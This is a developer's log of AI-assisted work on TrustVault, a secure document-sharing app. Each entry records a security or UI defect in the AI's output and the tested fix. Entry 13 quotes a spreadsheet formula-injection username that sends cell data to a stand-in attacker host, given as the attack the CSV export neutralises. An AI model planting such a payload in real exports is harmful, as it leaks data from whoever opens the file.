# PROMPTS.md - how AI was used, and where it was wrong

Tool: Claude (Anthropic), used as a pair-programmer in a chat/agent session.
Reused context and prompts (the parts I use every session) are in `docs/ai/`:

- `docs/ai/PROJECT_CONTEXT.md` - the ten non-negotiable security rules pasted at the start of every session, so the assistant cannot quietly undo a design decision.
- `docs/ai/SECURITY_REVIEW_PROMPT.md` - makes the assistant attack each diff as the judge would, quoting the line that stops each attacker or saying "NO CHECK FOUND".
- `docs/ai/TEST_GAP_PROMPT.md` - feeds `tools/mutation_check.py` output back in to find checks that no test proves.

> **Note on commit links.** The entries dated 2026-10-21 come from the first build session, which happened before the
> Git repository was initialised, so their fixes are part of the initial commit. Each entry names the file and the test
> that pins the fix. From the next entry on, each one links the commit that fixed it.

---

## 2026-10-21 - 1. Initial design and build

**Asked:** Build TrustVault in Python from the brief (screenshots of the hackathon page): three roles, per-document
read/edit grants, upload/search/versions, audit trail of every access and refusal, admin view, automated tests that
prove one user cannot reach another's documents; run locally; make security the priority because judges will attack it
and remove an authorisation check to see if the tests notice.

**Produced:** FastAPI + SQLite app; one `authorize()` choke point; AES-GCM envelope encryption; HMAC-chained audit log
with triggers and external anchors; share links; local suggestion engine; SPA without `innerHTML`; 261 pytest tests;
`tools/mutation_check.py` that removes each tagged check and re-runs the suite.

**What was wrong:** see entries 2-6 - the first draft had real defects in the audit view, the password policy, the
alert rules and the testability of two authorisation checks.

**What I did instead:** reviewed every route with `docs/ai/SECURITY_REVIEW_PROMPT.md`, looked at the running UI, and
ran the mutation tool until every check was proven by a failing test.

---

## 2026-10-21 - 2. Audit trail: admin audit search built a broken query  *(audit trail)*

**Asked:** "Add an admin endpoint to search the audit log by action, outcome, actor, document and date, joined with the
document name."

**Produced:** the WHERE clause was first built without a table alias, then patched for the JOIN with
`where.replace('action', 'a.action').replace('outcome', 'a.outcome')...`.

**What was wrong:** `str.replace` also rewrote the **bound parameter names** - `:action` became `:a.action` - so any
filter by action would have raised an SQL error, and the admin's main investigation tool would have failed exactly when
it was needed. String-patching SQL is also the habit that leads to injection bugs.

**What I did instead:** wrote every clause with the `a.` alias from the start, values only as bound parameters, one
WHERE string used for both COUNT and SELECT. Pinned by `tests/test_audit.py::test_audit_search_filters`
(filters by outcome+actor, by action prefix `permission.`, and by document id).
**Fixed in:** `trustvault/routes/admin.py` (`audit_search`) - initial commit.

---

## 2026-10-21 - 3. Authentication: weak password accepted  *(access control)*

**Asked:** "Add a password policy: minimum 12 characters, reject common passwords and passwords containing the username."

**Produced:** a length check plus an exact-match list of ~15 common passwords.

**What was wrong:** `password1234` passed - it is 12 characters and not literally in the list. Attackers' wordlists
are exactly "common word + digits/symbols". My own test `test_password_policy` failed with 200 instead of 400.

**What I did instead:** strip leading/trailing digit and symbol padding and compare the remaining core against common
base words; also reject all-digit cores. **Fixed in:** `trustvault/security.py` (`password_problems`) - initial commit.
Test: `tests/test_auth.py::test_password_policy`.

---

## 2026-10-21 - 4. Audit/admin view: false "id probing" alert  *(audit trail)*

**Asked:** "Add admin alerts for things worth noticing: bursts of refused document access, password guessing, bulk
downloads, share links used from many addresses."

**Produced:** the `access_probing` rule counted **every** `document.*` audit row with outcome `denied`.

**What was wrong:** an owner's own **rejected uploads** (`document.upload`, reason `validation`, e.g. trying to upload
an `.html` file) are also `denied` rows. After running `scripts/attack_selftest.py`, the admin dashboard accused the
owner *alice* of "possible id probing". An alert that names the wrong person is worse than none: it trains the admin to
ignore alerts. The tests had only checked that the rule *fires*, never that it does *not* fire on innocent events.
Found by looking at a screenshot of the dashboard, not by a test. The seeded first admin also raised a "new
administrator" alert on every fresh install.

**What I did instead:** probing counts only access refusals (validation rejections excluded); seeded bootstrap events
excluded. Added the negative test `tests/test_admin.py::test_rejected_uploads_are_not_reported_as_probing` and
`test_quiet_system_raises_no_alerts`. **Fixed in:** `trustvault/alerts.py` - initial commit.

---

## 2026-10-21 - 5. Authorisation: dead "last administrator" check  *(authorisation)*

**Asked:** "Admins must not be able to remove the last administrator."

**Produced:** `if target is an active admin losing admin status and active_admins <= 1: refuse`, alongside a separate
"admins cannot change their own role or deactivate themselves" check.

**What was wrong:** while writing its test I could not make it fire: the caller is always an active admin and cannot
target themselves, so whenever the target is an active admin there are already two. The check was **unreachable**. Dead
security code is harmful here: it looks like protection in review, no test can prove it, and when the judges delete it
nothing fails - which reads as "the tests test nothing".

**What I did instead:** removed it, documented the real invariant at the remaining check (`AUTHZ-CHECK[admin-cannot-change-self]`)
and tested that instead (`tests/test_admin.py::test_admin_cannot_lock_themselves_out`,
`test_another_admin_can_remove_an_admin_and_its_session_dies`). **Fixed in:** `trustvault/routes/admin.py` - initial commit.

---

## 2026-10-21 - 6. Authorisation tests: a check the mutation tool could not remove cleanly  *(authorisation)*

**Asked:** "Tag every authorisation check and write a tool that removes each one and proves a test fails."

**Produced:** the tool mutates the tagged line (`if <deny>:` → `if False:`). In `grant_access` the suggestion check was a
multi-line `if (... or ...):` with the tag on its first line.

**What was wrong:** mutating only the first line of a multi-line condition produces a syntax error, so the "mutant"
would crash the import and be reported as *killed* - a pass for the wrong reason, proving nothing about whether a test
notices a missing check. Separately, two checks are defence-in-depth (inactive user, admin with a grant row): the HTTP
layer stops those requests first, so deleting the inner check would not fail any HTTP test.

**What I did instead:** every check is now a single line (`mismatch = (...)` then `if mismatch:  # AUTHZ-CHECK`); the
tool refuses duplicate names; defence-in-depth checks got unit tests that call `effective_permission()` directly
(`tests/test_authz_unit.py`). Result: every tagged check is killed by an assertion about access, not by a crash.
**Fixed in:** `trustvault/routes/sharing.py`, `tests/test_authz_unit.py` - initial commit.

---

## 2026-10-21 - 7. Authentication: password brute force through "change password"  *(access control)*

**Asked:** (review pass with `docs/ai/SECURITY_REVIEW_PROMPT.md`) "Attack every endpoint that checks a secret. Which ones
are not covered by the login lockout and rate limit?"

**Produced (originally):** `POST /api/auth/change-password` verified `current_password` and returned 400 on a mismatch -
with no counter, no lockout and no rate limit.

**What was wrong:** anyone holding a stolen session cookie could guess the account's real password through this endpoint
as fast as Argon2 allows, completely bypassing the 5-attempt sign-in lockout - and then keep the account after the
session expired. The first draft's tests only checked that a wrong current password is refused once.

**What I did instead:** wrong current-password attempts now count towards the same lockout as sign-in; reaching it locks
the account **and ends every session** (the session doing the guessing is probably stolen). Tagged
`AUTHZ-CHECK[password-guessing-locks-account]`; test `tests/test_auth.py::test_change_password_cannot_be_used_to_brute_force`.
**Fixed in:** `trustvault/routes/auth.py` (`change_password`) - initial commit.

---

## 2026-10-22 - 8. Three access levels and three demo logins  *(access control)*

**Asked:** "I want an admin login, a document owner and a viewer, with CRUD for each. For a viewer, the owner must
choose whether they can just view, edit or download. Create three logins."

**Produced:** levels `view` < `download` < `edit` in `authz.PERMISSION_ACTIONS`; a server-side renderer
(`trustvault/preview.py`) so view-only users get watermarked PNG pages / extracted text instead of the file;
admin "delete user"; a seed with exactly three accounts (`admin`, `owner`, `viewer`) and one document per level.

**What was wrong:** the demo passwords from the first version (`admin` / `Admin!Vault2026`, `alice` /
`Alice!Vault2026`, ...) all **contained the username**, which the app's own password policy forbids. The seed script
wrote Argon2 hashes directly and bypassed `password_problems()`, so the credentials printed in the README contradicted
the policy the README claims - exactly the kind of inconsistency a judge notices. Nothing tested the seed against the
policy. Found while choosing the new passwords.

**What I did instead:** new passwords (`Keeper!Vault2026`, `Author!Vault2026`, `Reader!Vault2026`) that pass the policy,
and a regression test that runs every seeded password through `password_problems()`
(`tests/test_seed.py::test_seed_passwords_pass_our_own_policy`). Design note recorded in WRITEUP: "view only" is built
as a rendering because simply showing the original PDF in the browser's viewer would let the viewer save it, which
would make the level meaningless.
**Fixed in:** `scripts/init_db.py`, `tests/test_seed.py`.

---

## 2026-10-22 - 9. Sessions: the sign-in page silently revived an expired session  *(access control)*

**Asked:** (Phase 1 spec) "Sign people out after `SESSION_IDLE_MINUTES` = 15 without activity, warn them first with a
'Stay signed in' button, send them back to the page they were on, and audit `auth.session_expired`."

**Produced:** server side, the idle check in `deps.current_principal` plus an `auth.session_expired` audit row; client
side, a timer that shows the warning and, when it runs out, clears the user and shows the sign-in page.

**What was wrong:** the two clocks disagreed. The server only rewrote `last_seen_at` when it was more than **60 s** old,
and the browser counted from its own last request - so the browser's 15 minutes could end *before* the server's. The
sign-in page then called `GET /api/auth/me` to see whether a session already existed... the server still considered it
alive, and **that request slid the idle timer forward**: the person was silently signed back in by the very screen that
was supposed to sign them out. An unattended screen would never actually lock. Found by walking through the client and
server timelines side by side while writing `test_sessions.py`; no test failed, because the server-only tests were
right.

**What I did instead:** when the browser's timer ends first it calls `POST /api/auth/logout` with
`{"reason": "idle"}`, which deletes the session and records `auth.session_expired` with `detected: browser`; the sliding
write threshold dropped from 60 s to 15 s and the browser ends 20 s early, so it never runs behind the server.
Countdowns never call the server, so they cannot keep a session alive. Pinned by
`tests/test_sessions.py::test_the_browser_can_end_an_idle_session_and_it_is_recorded` and
`test_idle_for_15_minutes_signs_you_out_and_is_recorded_once` (server clock moved 15 min 1 s), and checked in a real
browser (Playwright) with a 1-minute idle timeout: warning → *Stay signed in* → idle → sign-in page → back to the same
document. THREATS.md T68.
**Fixed in:** Phase 1 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-22 - 10. Authorisation: one uniform 403 made a removed check invisible to the tests  *(authorisation, audit trail)*

**Asked:** (Phase 1 spec) "Every endpoint that returns file content goes through one shared access-check function. Every
refusal says 'You don't have access to this file.' Every denial is audited with the internal reason."

**Produced:** `authz.check_access()` with the reasons in a fixed order and `require_access()` raising the one 403;
the existing matrix tests updated from "404 for strangers, 403 for low levels" to "403 for everyone".

**What was wrong:** with every refusal now identical, the check `if perm is None: deny("no_grant")`
(`AUTHZ-CHECK[no-permission-no-access]`) became *invisible* to status-code tests: delete it and the level check further
down still refuses, with a 403 that looks exactly the same - only the recorded reason changes (to the meaningless
`None_cannot_view`). The first draft also looked the level up with `PERMISSION_ACTIONS[perm]`, so the mutant crashed
with a `KeyError` and was reported **killed** - by a 500, for the wrong reason, which is exactly the trap PROMPTS
entry 6 describes. The audit trail would have been quietly wrong (every stranger recorded as a level problem) and no
test would have said so.

**What I did instead:** the level lookup is total (`.get(perm, frozenset())`), so the mutant now behaves like a real
deletion; and every refused case in `tests/test_authz_matrix.py` asserts both the exact 403 body **and** the internal
reason in the audit row (`no_grant`, `grant_expired`, `admin_never_reads_content`, `<level>_cannot_<action>`).
`tests/test_authz_unit.py` pins all 17 reasons and their order. The mutation run now kills
`no-permission-no-access` through a reason assertion (`docs/mutation_report.txt`). A structural test,
`test_every_document_route_goes_through_the_one_access_check`, parses the route code so "one shared function" is proven,
not just claimed.
**Fixed in:** Phase 1 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-22 - 11. The mutation tool itself could report a meaningless result  *(other: test tooling)*

**Asked:** "Run `tools/mutation_check.py` over the 42 checks while I finish the documentation and two small fixes."

**Produced:** the run started; meanwhile three refusals that were not yet audited (invalid grant duration, extending a
deactivated person's grant, the link-open rate limit) were fixed in `routes/sharing.py`.

**What was wrong:** the tool lists every tagged check with its **line number** at the start, then copies the project
and replaces "line N" for each mutant. Editing `sharing.py` during the run shifted its lines by three, so every later
`sharing.py` mutant would have replaced the wrong line - a blank line or an unrelated statement - and could be
reported KILLED or SURVIVED for reasons that have nothing to do with the check. Nothing warned about it. Found by
re-reading the tool before trusting its report.

**What I did instead:** stopped the run; the tool now refuses to mutate a line whose text no longer matches what it
listed and reports `SOURCE CHANGED DURING RUN - rerun` instead of a verdict; then a clean rerun on frozen code
(`docs/mutation_report.txt`).
**Fixed in:** Phase 1 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-22 - 12. Authorisation: a share link opened documents for people with no grant  *(authorisation, audit trail)*

**Asked:** (Phase 1 spec, section 4) "A link only works when signed in as the intended recipient, who must still hold a
valid grant. ... The server rejects the link if ... the grant was revoked or has expired." And section 2: record the
reasons `no_grant, grant_expired, link_expired, link_revoked, wrong_user, view_only, not_found`; only admins can see them.

**Produced:** links bound to one recipient, signed, 5 minutes, with `access_version` - but the link itself was treated as
the access: `check_access()` took "the better of the grant and the link", so a link made for someone **without any
grant** opened the document for 5 minutes, and a "download" link raised a View-only person to download. My own reason
names (`link_wrong_recipient`, `view_cannot_download`, `document_not_found`) differed from the spec's, and owners could
read the refusal reasons in their document's activity list.

**What was wrong:** a link was a second, independent way in. Revoking someone's grant killed their links only because
revoking also bumped `access_version` - a coincidence, not the rule - and an owner could hand a 5-minute download pass to
someone they had only ever given View. The spec's own reason names were what an assessor would search the audit log for.
No test failed: the tests had been written to the same wrong understanding. Found by re-reading the original spec word
by word before Phase 2.

**What I did instead:** a request through a link now needs a valid link **and** a live grant; the link can only narrow the
grant's level (`AUTHZ-CHECK[link-level-caps-action]`); a link can only be made for someone who already has access, at
most at their level (`link-recipient-needs-grant`, `link-not-above-grant`); a request that came through a link must have a
valid link even if a grant exists (spec step 6). Reasons renamed to the spec's; the owner's activity endpoint strips them
(`tests/test_audit.py::test_only_admins_see_why_a_request_was_refused`). New tests:
`tests/test_authz_unit.py::test_a_link_never_gives_access_on_its_own`, `test_a_request_through_a_bad_link_is_refused_even_with_a_grant`,
`tests/test_links.py::test_a_link_is_only_for_someone_who_already_has_access`, `test_link_dies_with_the_grant_behind_it`,
`test_link_works_at_4_59_and_fails_at_5_01`. 45/45 mutants killed afterwards.
**Fixed in:** Phase 2 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-22 - 13. Audit export: a username could run as a spreadsheet formula  *(audit trail)*

**Asked:** (Phase 3 spec) "Export filtered results to CSV, include the SHA-256 of the exported file, and log the export."

**Produced:** the first plan wrote rows with Python's `csv` module (quoting every cell) and treated that as escaping.

**What was wrong:** quoting stops a comma from splitting a cell; it does not stop Excel or LibreOffice from *running*
a cell that starts with `=`, `+`, `-` or `@`. And the audit trail is full of attacker-chosen text: a failed sign-in records
whatever was typed as the username (`=HYPERLINK("http://evil.example/?"&A1,"Click for details")`), and every row records the
user agent. The administrator - the person most likely to open the export - would be the victim. The upload validator
already refused CSV formula injection in *uploaded* files; the same attack had simply not been considered for a file the
app *produces*.

**What I did instead:** `routes/admin.csv_cell()` prefixes any cell starting with `=`, `+`, `-`, `@`, tab, CR or LF with
`'` (the OWASP rule), tagged `AUTHZ-CHECK[csv-formula-neutralised]` so the mutation tool proves a test notices if it is
removed. The audit trail keeps the exact text; only the export is neutralised. Test:
`tests/test_audit_page.py::test_exported_cells_cannot_run_as_spreadsheet_formulas` (signs in as three formulas with a
formula user agent, then checks no exported cell starts with a formula character); the attack script does the same against
the running server. THREATS.md T70. 46/46 mutants killed afterwards.
**Fixed in:** Phase 3 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-22 - 14. Audit trail: "events from the same session" without leaking the session or breaking the chain  *(audit trail)*

**Asked:** (Phase 3 spec) "Clicking a row opens a detail panel showing the full event, user agent, hash, and other events
from the same session." Plus the spec's hash fields and "write a migration that backfills hashes for existing rows".

**Produced:** the obvious design - store the session's `token_hash` in each audit row, add it to the hashed fields, and
backfill by updating old rows.

**What was wrong:** three things. (1) `token_hash` is the primary key of the live `sessions` table; copying it into the
audit trail (which administrators read and export) puts a session lookup key in every export. (2) Adding a column to the
hash input changes the hash of every row already written, so the first "Verify integrity" after the upgrade would report
the whole trail as tampered - or the "fix" would be to re-hash history, which is exactly what the chain exists to prevent.
(3) A backfill by `UPDATE` needs the append-only triggers switched off, breaking the rule "no code path may update or delete
audit rows".

**What I did instead:** `security.session_ref()` - 16 hex characters of a separately labelled SHA-256 of the token hash,
useless as a credential. The new column is hashed **only when set**, so every v3 row keeps its original hash and the
upgrade is a plain `ADD COLUMN`. A pre-chain audit table is *copied* through the normal insert path into the chained table
(never updated), and the upgrade itself is recorded as `audit.migrated`. Tests:
`tests/test_audit_page.py::test_detail_panel_lists_other_events_from_the_same_session` (neither the token nor its hash
appears anywhere in the trail), `tests/test_migrations.py::test_a_v3_database_is_upgraded_in_place_and_its_chain_still_verifies`
(old rows byte-identical), `test_an_audit_table_without_hashes_gets_them_backfilled`. THREATS.md T73, T74.
**Fixed in:** Phase 3 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-22 - 15. Audit page: "Show this session" showed one event, and "Clear" sent a click as a filter  *(other: UI)*

**Asked:** build the audit page UI for the new endpoints.

**Produced:** a detail panel with *Show this session in the table*, and a *Clear* button wired as `onclick: clearAll`.

**What was wrong:** found by the scripted browser walk-through (Playwright, desktop and phone screenshots), not by the API
tests. *Show this session* added the session filter on top of whatever was already filtered - with the action set to
"Open document" it showed 1 event instead of the session's 7. After `clearAll` gained an optional parameter, the *Clear*
button passed the click event in as that parameter, so the page asked the server for `session=[object PointerEvent]` and
got a 422. The API was right both times; the page was not.

**What I did instead:** *Show this session* clears every other filter first; *Clear* calls `clearAll()` with no argument.
Re-ran the walk-through: the panel lists 7 events and the table shows the same 7. Also from the screenshots: sequence
numbers and IP addresses wrapped one character per line, and hover stuck on phones after a tap - fixed in `style.css`.
**Fixed in:** Phase 3 commit, 2026-10-22 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-23 - 16. Two-step sign-in: forced set-up would have locked the judges out of the demo  *(access control)*

**Asked:** (Phase 7 spec) "TOTP two-factor authentication for admins and owners: QR enrolment, backup codes, and
enforcement at login. Audit enrolment and failures." - done before Phases 4-6, at my request.

**Produced:** a correct design for real use: an administrator or owner without two-step sign-in gets no session after
the password, only a set-up step with a QR code; the first valid code turns it on.

**What was wrong:** the hand-in requires *shared* demo logins in the README. With forced set-up, the first judge to sign
in as `admin` would scan the QR code with their own phone - and from then on every other judge would be asked for a code
from a phone they do not have. The security was right and the demo would have been broken for everyone after the first
person. It was also untestable from the attack script, which signs in as admin and owner.

**What I did instead:** the seed enrols the demo `admin` and `owner` with keys published in the README (with QR images
and `scripts/demo_code.py`), stated as a demo-only exception in THREATS.md; the forced QR set-up is demonstrated with a
newly created owner. The attack script computes codes from the published keys. A code never works twice, so two judges
in the same 30 seconds get "wait for the next code" rather than a silent replay. Tests:
`tests/test_seed.py::test_a_fresh_seed_signs_in_with_the_published_demo_keys`,
`tests/test_two_factor.py::test_an_administrator_must_set_it_up_before_any_session_exists`, `test_a_code_never_works_twice`.
**Fixed in:** Phase 7 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-23 - 17. Access control: the admin user list would have shipped every TOTP key to the browser  *(access control)*

**Asked:** add the two-step columns (`totp_secret`, `totp_pending`, `totp_last_step`) to `users`.

**Produced:** the columns, sealed with AES-GCM - but the existing admin endpoint `GET /api/admin/users` was written as
`SELECT u.* ...` and only removed `password_hash` before returning each row.

**What was wrong:** every new column of `users` would silently flow to every administrator's browser - including the
sealed key and the half-finished key of someone moving to a new phone. Sealed is not a reason to hand it out: the admin
must never be able to read (or replay) another person's second factor. A related trap: an admin who could reset their
*own* two-step sign-in would let a stolen admin session strip its own protection.

**What I did instead:** the user list strips every secret column and reports only `two_factor: true/false`; a test
asserts no response ever contains `totp_secret`, `totp_pending` or `password_hash`, and the AI context file now says
"never `SELECT u.*` into a response". Admins can reset someone else's two-step sign-in (lost phone - audited, alerted,
their sessions end) but not their own (`AUTHZ-CHECK[admin-cannot-reset-own-2fa]`). Tests:
`tests/test_two_factor.py::test_secrets_and_backup_codes_are_never_stored_in_clear`,
`test_an_administrator_can_reset_someone_who_lost_their_phone`; attack script "no two-step secret ever leaves the server".
64/64 mutants killed afterwards.
**Fixed in:** Phase 7 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-23 - 18. UI: the code field's pattern was an invalid regular expression  *(other: UI)*

**Asked:** a code input that accepts a 6-digit code or a backup code like `xxxx-xxxx`.

**Produced:** `pattern="[0-9A-Za-z -]{6,12}"` on the input.

**What was wrong:** current browsers compile `pattern` with the regular-expression `v` flag, where a bare `-` inside a
character class is a syntax error. Chrome logged "Pattern attribute value ... is not a valid regular expression" on every
sign-in page and simply ignored the attribute. Found by the scripted browser walk-through, which fails on any console
error; no API test could have seen it.

**What I did instead:** removed the attribute (the server already validates and normalises the code, and the browser
check added nothing). Re-ran the walk-through: no console errors. Also from that walk-through: a test user's password was
refused because it contained the username - the policy working as intended.
**Fixed in:** Phase 7 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-23 - 19. Authorisation tests: the mutation check found the first-code check untested  *(authorisation)*

**Asked:** write the tests for two-step sign-in (26 by the end), then run `tools/mutation_check.py` on the frozen code.

**Produced:** 25 tests covering wrong codes at sign-in, replay, lockout, backup codes, turning it off, admin reset... and
none that sent a *wrong* code to the first-time set-up step (`/api/auth/login/enroll`). Every enrolment test used a valid
code.

**What was wrong:** the mutation check removed `if step is None:` in `login_enroll` (`AUTHZ-CHECK[enrolment-needs-a-working-code]`)
and the whole suite still passed: **63/64**. With that check gone, an administrator's account could be "protected" by a
key nobody had proven they hold - any six digits would have completed set-up and opened a session. The code was right;
nothing proved it would stay right.

**What I did instead:** added `tests/test_two_factor.py::test_first_time_set_up_needs_a_working_code` (a wrong first code
returns 401, opens no session, enables nothing, issues no backup codes and is audited `auth.2fa_failed` / `stage: enroll`;
the right code on the same attempt then works). Re-ran that mutant: killed. Both runs are in `docs/mutation_report.txt`.
This is the tool doing its job - the same lesson as entry 10: a check is only as good as the test that fails without it.
**Fixed in:** Phase 7 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-23 - 20. Authorisation: the label-change route arrived without its row in the access matrix  *(authorisation)*

**Asked:** (Phase 4 spec) "Classification labels: Public / Internal / Confidential, chosen at upload (default Internal)
and changeable later, every change audited."

**Produced:** `PUT /api/documents/{id}/classification`, starting with `require_access(..., Action.CLASSIFY)` like every
document route (owner-only: *classify* is in no permission level), audited as `document.classified`, with its own tests. No row for it in the authorisation matrix.

**What was wrong:** the matrix is where every document route is attacked by all nine kinds of caller - Edit, Download
and View holders, no grant, an expired grant, an admin, anonymous - with the uniform 403, no side effect and the right
reason in the trail checked for each. Without a row, the route that can *lower* a Confidential label sat outside the
one place that guarantees every document route meets every kind of caller. `tests/test_authz_matrix.py::test_matrix_covers_every_document_route` lists every
`{doc_id}` route in the app and failed: the new route was not covered.

**What I did instead:** added the *classify* row to the matrix, so the route is checked against all nine callers like
every other one (now 162 cases; reasons such as `edit_cannot_classify`, `download_cannot_classify`, `view_only`,
`admin_never_reads_content`), plus `tests/test_classification.py::test_only_the_owner_can_change_it`. That structural
test is the guard rail I want: a new route cannot ship without every kind of caller being thrown at it. The seven new
Phase 4 checks were then mutation-tested on the frozen code - 7/7 killed - and the full run is in
`docs/mutation_report.txt`.
**Fixed in:** Phase 4 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## 2026-10-23 - 21. UI: owners never saw new requests, and the activity list showed raw event names  *(other: UI)*

**Asked:** "The owner sees pending requests and approves or denies." - plus my standing rule to walk every new screen in
a real browser before calling a phase done.

**Produced:** a *Requests waiting for you* panel on the owner's Documents page, an API that returned the requests
correctly, and 15 API tests that all passed.

**What was wrong:** the scripted browser walk-through (viewer asks, owner looks) timed out: the owner was already on
Documents, clicked **Documents** again, and nothing happened - the address (`#/documents`) did not change, so the page
never reloaded and the new requests never appeared. A real owner would have concluded nobody had asked. The screenshots
showed two more defects no API test can see: the document's activity list printed `access.request_approved` and
`access.requested` instead of words, and the Confidential notice put its lock icon on a line of its own. I had also
approved the request for *Board minutes* - the seed document whose description says Vikram must never reach it - in
the walk-through.

**What I did instead:** a navigation link for the page you are already on now reloads that page; the five new audit
events have plain words in the activity list; the notices keep their icon beside the text. The walk-through now
approves *Audit papers* and denies *Board minutes* ("Only the board members"), matching the seed and the demo script.
Re-ran it: owner sees both requests, approves one, denies the other; the viewer sees *Approved* with a countdown and
*Denied* with the reason; the Confidential page carries `CONFIDENTIAL · viewer · <time>`; no console errors; phone width
checked.
**Fixed in:** Phase 4 commit, 2026-10-23 - https://github.com/velpuribhargavi/TrustVault_Bhargavi/commits/main

---

## Template for the next entries

```
## YYYY-MM-DD - N. <title>  *(authorisation | audit trail | other)*
**Asked:** <prompt or fair summary>
**Produced:** <what the AI gave>
**What was wrong:** <specifically - the line, the attack, the failing test>
**What I did instead:** <the fix, the test that pins it>
**Fixed in:** <commit link>
```
